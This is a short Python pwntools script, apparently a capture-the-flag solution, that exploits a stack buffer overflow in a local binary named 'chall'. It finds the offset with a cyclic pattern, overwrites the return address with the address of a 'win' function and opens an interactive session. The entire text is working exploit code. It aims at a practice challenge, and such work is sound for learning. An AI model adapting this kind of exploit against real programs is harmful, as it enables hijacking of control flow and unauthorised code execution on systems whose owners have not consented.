from pwn import *
chall = ELF("./chall")
p = process("./chall")
#00000000004011b6 <win>:
win = p64(0x00000000004011b6)
pattern = "A" * cyclic_find("kaaa")
p.recvuntil("Send it to me then......")
raw_input("GDB gan")
p.sendline(pattern +win)
p.interactive()